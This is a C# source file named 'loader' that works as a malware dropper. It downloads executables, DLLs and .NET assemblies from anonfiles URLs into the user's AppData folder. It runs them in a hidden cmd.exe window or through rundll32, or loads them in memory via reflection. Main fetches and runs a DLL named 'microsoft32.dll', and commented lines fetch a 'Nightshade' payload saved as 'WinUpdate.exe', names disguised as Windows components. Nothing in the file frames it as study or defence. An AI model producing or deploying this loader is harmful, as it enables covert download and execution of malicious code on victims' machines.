using System;
using System.Net;
using System.Net.Http;
using System.Reflection;

namespace loader {
    public class Program {
    
        public static void GetFile(string url, string filename) {
            string currentUser = Environment.UserName;
            string downloadPath = $@"C:\Users\{currentUser}\AppData\Roaming\{filename}";
            using(WebClient myWebClient = new WebClient()) {
                
                myWebClient.DownloadFile(url, downloadPath);
            }
        }

        public static void RunCommand(string command) {
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = command;
            process.StartInfo = startInfo;
            process.Start();
        }

        public static void PortableExecutableLoader(string remotePEUrl, string localPEName) {
            string currentUser = Environment.UserName;
            GetFile(remotePEUrl, localPEName);
            string localPEPath = $@"C:\Users\{currentUser}\AppData\Roaming\{localPEName}";
            string command = $"/c {localPEPath}";
            RunCommand(command);
        }

        private static byte[] GetModule(string url)
        {
            HttpClient client = new HttpClient();
            HttpResponseMessage response = client.GetAsync(url).Result;
            response.EnsureSuccessStatusCode();
            byte[] module = response.Content.ReadAsByteArrayAsync().Result;
            return module;
        }

        public static void ExecuteManagedAssembly(byte[] assemblyBytes)
        {
            try 
            {
                Assembly assembly = Assembly.Load(assemblyBytes);
                MethodInfo method = assembly.EntryPoint;
                object execute = method.Invoke(null, null);
                Console.WriteLine("Assembly executed");
            }
            catch (Exception e)
            {
                string error = e.ToString();
                Console.WriteLine($"Error executing assembly: {e}");
            }
        }

        public static void ExecAssembly(string url)
        {
            byte[] asm = GetModule(url);
            ExecuteManagedAssembly(asm);
        }



        public static void DllLoader(string remoteDllUrl, string localDllName, string dllEntryName) {
            string currentUser = Environment.UserName;
            GetFile(remoteDllUrl, localDllName);
            string localDllPath = $@"C:\Users\{currentUser}\AppData\Roaming\{localDllName}"; 
            string command = $"/c rundll32.exe {localDllPath},{dllEntryName}";
            RunCommand(command);
        }

        public static void Main(string[] args) {

            //string remotePEUrl = "https://cdn-144.anonfiles.com/ted5k4veyd/c1a395b4-1657040387/Nightshade.exe";
            //string localPEName = "WinUpdate.exe";
            //PortableExecutableLoader(remotePEUrl, localPEName);

             string remoteDllUrl = "https://cdn-121.anonfiles.com/f6k7k0vfy0/02dfc28a-1657040667/microsoft32.dll";
             string localDllName = "microsoft32.dll";
             string dllEntryName = "DllMain";
             DllLoader(remoteDllUrl, localDllName, dllEntryName);

            //string assembly = "https://cdn-144.anonfiles.com/D5Zaj7vay0/417cc9d6-1657040199/Nightshade.dll";
            //ExecAssembly(assembly);
        }
    }
}
